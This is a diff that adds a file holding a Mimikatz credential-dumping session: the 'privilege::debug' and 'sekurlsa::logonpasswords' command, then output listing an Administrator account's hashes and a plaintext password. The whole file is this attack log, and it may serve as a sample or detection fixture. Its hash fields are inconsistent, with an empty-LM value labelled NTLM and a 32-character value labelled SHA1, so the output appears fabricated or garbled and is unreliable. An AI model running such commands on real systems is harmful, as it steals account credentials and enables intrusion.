@@ -1,0 +1,19 @@
+mimikatz(commandline) # "privilege::debug" "sekurlsa::logonpasswords" exit
+Privilege '20' OK
+Authentication Id : 0 ; 999
+Session           : Interactive
+User Name         : SYSTEM
+Domain            : NT AUTHORITY
+Logon Server      :
+Logon Time        : 9/21/2026 12:00:00 PM
+SID               : S-1-5-18
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : CORP
+         * NTLM     : aad3b435b51404eeaad3b435b51404ee
+         * SHA1     : 31d6cfe0d16ae931b73c59d7e0c089c0
+        tspkg :
+         * Username : Administrator
+         * Domain   : CORP
+         * Password : P@ssw0rd123!
